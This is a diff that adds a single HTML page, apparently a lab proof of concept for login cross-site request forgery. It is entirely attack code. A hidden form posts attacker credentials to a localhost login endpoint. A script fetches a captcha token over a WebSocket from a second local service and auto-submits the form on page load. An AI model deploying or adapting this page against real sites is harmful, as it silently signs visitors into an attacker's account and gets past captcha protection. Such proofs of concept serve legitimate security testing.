@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html>
+<body>
+  <form id="csrfForm" action="http://localhost:3001/login" method="POST">
+    <input type="hidden" name="username" value="attacker" />
+    <input type="hidden" name="password" value="attacker" />
+    <input type="hidden" name="captchaToken" id="captchaInput" value="" />
+    <input type="submit" value="Submit CSRF">
+  </form>
+  
+  <script>
+    const captchaInput = document.getElementById('captchaInput');
+    const form = document.getElementById('csrfForm');
+    
+    const ws = new WebSocket('ws://localhost:3004');
+    ws.onopen = () => {
+      ws.send(JSON.stringify({ type: 'visited' }));
+    };
+
+    ws.onmessage = (event) => {
+      const data = JSON.parse(event.data);
+      if (data.type === 'captcha') {
+        captchaInput.value = data.captchaToken;
+        // Submit the form once we have the captcha token
+        form.submit();
+      }
+    };
+
+    ws.onerror = (error) => {
+      console.error('WebSocket error:', error);
+    };
+
+    ws.onclose = () => {
+      console.log('WebSocket connection closed');
+    };
+  </script>
+</body>
+</html>
